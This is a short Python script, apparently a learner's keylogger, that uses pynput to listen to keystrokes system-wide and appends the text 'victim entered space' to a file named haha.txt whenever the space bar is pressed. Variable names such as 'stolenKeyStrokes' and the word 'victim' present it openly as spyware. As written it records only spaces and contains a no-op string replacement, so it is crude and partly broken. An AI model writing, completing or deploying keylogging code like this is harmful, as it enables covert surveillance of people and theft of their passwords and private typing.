from pynput import keyboard
# import pynput
# from pynput import *
# import pynput as p
import logging


# def = function
def on_press(keystroke):
    # return "Hello world"
    key = str(keystroke).replace("", "")
    if key == "Key.space":
        keystroke = 'victim entered space'
        with open("haha.txt", "a") as stolenKeyStrokes:
            stolenKeyStrokes.write(keystroke)
# end of method
# print(on_press())
with keyboard.Listener(on_press = on_press) as signal:
    signal.join()